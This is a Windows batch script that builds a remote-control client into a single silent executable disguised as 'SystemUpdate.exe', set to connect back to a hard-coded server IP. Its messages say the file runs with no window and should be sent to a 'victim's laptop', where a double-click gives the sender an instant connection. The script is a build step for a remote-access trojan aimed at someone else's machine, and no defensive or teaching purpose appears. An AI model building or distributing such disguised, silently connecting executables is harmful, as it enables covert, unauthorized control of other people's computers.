@echo off
echo ========================================
echo BUILDING STANDALONE CLIENT EXE
echo ========================================
echo.
echo This will create a single .exe file that:
echo - Needs NO installation
echo - Runs silently (no window)
echo - Connects automatically to your IP
echo.
echo Your Server IP: 172.28.1.78
echo.

REM Build the standalone executable
python -m PyInstaller --onefile --noconsole --clean ^
    --name "SystemUpdate" ^
    --icon=NONE ^
    --add-data "LAST_IP.txt;." ^
    client_control.py

echo.
echo ========================================
echo [DONE] EXE created in: dist\SystemUpdate.exe
echo.
echo Just send SystemUpdate.exe to victim's laptop!
echo They double-click it = instant connection!
echo ========================================
pause
